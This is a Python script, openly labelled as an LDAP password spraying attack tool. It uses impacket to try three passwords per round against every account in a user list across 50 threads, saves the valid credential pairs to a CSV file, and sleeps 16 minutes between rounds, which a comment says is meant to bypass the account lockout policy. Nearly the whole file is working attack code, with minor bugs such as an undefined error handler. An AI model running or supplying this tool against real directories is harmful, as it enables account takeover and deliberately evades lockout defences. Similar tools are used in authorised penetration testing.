# Script to perform LDAP password spraying attack

import datetime, time
import sys
from concurrent.futures.thread import ThreadPoolExecutor
import threading

lock = threading.Lock()
account_count = 0

def readusers(userlist):  
    # Creating an array out of the users file
    with open(userlist) as f:
        usernames = f.readlines()
    generated_usernames_stripped = [userlist.strip() for userlist in usernames]
    return generated_usernames_stripped

def readpasswords(passwordlist):  
    # Creating an array out of the passwords file
    with open(passwordlist) as pass_obj:
        return [p.strip() for p in pass_obj.readlines()]

def write_output(username, password, output_file_name):
    try:
        with open(output_file_name + ".csv", 'a') as wf:
            wf.write(username + "," + password + "\n")
    except Exception as e:
        print(str(e))


def print_log(data):
    # Print and write log to file
    print (data)
    with open("adfs-spray.log", 'a') as wf:
        wf.write(
            "[{}] {}\n".format(datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'), data)
        )

# LDAP AUTHEN
#
from impacket.ldap import ldap
def create_ldap_con(domain):
    try:
        con = ldap.LDAPConnection("ldap://{}".format(domain), )
        return con
    except Exception as e:
        print(e)
        return None

def ldap_attempt(username, password, domain, output_filename):
    global account_count
    try:
        
        conn = ldap.LDAPConnection("ldap://{}".format(domain), baseDN='dc=domain,dc=tld')
        # conn = ldap.LDAPConnection("ldap://10.16.34.26:389")
    except Exception as e:
        return 

    try:
        bool = conn.login(username, password, domain, '', '')
        if bool is True:
            account_count += 1
            write_output(username, password, output_filename)
            print("[+]Found: %s:%s" % (username, password))
            lock.release()
    except Exception as e:
        pass
    conn.close()


# 

def main():
    if len(sys.argv) < 3:
        print( "[+] Usage: ldap-spray.py [userlist.txt] [passlist.txt]" )
        exit(1)
    userlist = sys.argv[1]
    passlist = sys.argv[2]

    # userlist = "test_userlist.txt"
    # passlist = "test_passlist.txt"

    threads = 50
    sleep = 16 # minute

    usernames, passwords = [], []
    usernames = readusers(userlist)
    passwords = readpasswords(passlist)
    

    total_accounts = len(usernames)
    total_passwords = len(passwords)
    total_attempts = total_accounts * total_passwords
    print("Total users: %d" % total_accounts)
    print("Total passwords: %d" % total_passwords)
    print("Total attempts: %d" % total_attempts)
    print("Sleep time: %d minute" % sleep)

    ldapdomain = "ldapserver.domain.com"

    output_filename = "PasswordSpray_" + datetime.datetime.now().strftime('%d-%m-%Y')
    try:
        start_time = datetime.datetime.now()
        print("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
        write_output('Username', 'Password', output_filename)  # creating the 1st line in the output file
        
        executor = ThreadPoolExecutor(max_workers=threads)
        for i in range(0, total_passwords, 3):
            # trying spray one password to all user
            print_log("Password attempting: {}-{}/{}".format(i+1, i+3, total_passwords))
            for username in usernames:
                for j in range (0,3,1):
                    if i+j < total_passwords:
                        executor.submit(ldap_attempt, username, passwords[i+j], ldapdomain, output_filename)
                
            while(1): # Wait for all thread done
                time.sleep(1)
                pending = executor._work_queue.qsize()
                if pending == 0:
                    break
            print_log("Password done: {}-{}/{}".format(i+1, i+3, total_passwords))
            print_log("Running time: {}".format(datetime.datetime.now() - start_time))
            print_log("Sleeping %d minute ...." % sleep)
            time.sleep(60*sleep) # Sleep > 15 minute to bypass lockout policy
        executor.shutdown(wait=True) # Wait for all threads finish
        
        print("[*] Overall compromised accounts: %d" % account_count)
        print("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
    except Exception as e:
        excptn(e)

    except KeyboardInterrupt:
        print("[CTRL+C] Stopping the tool")
        exit(1)

    except Exception as e:
        excptn(e)


if __name__ == "__main__":
    main()
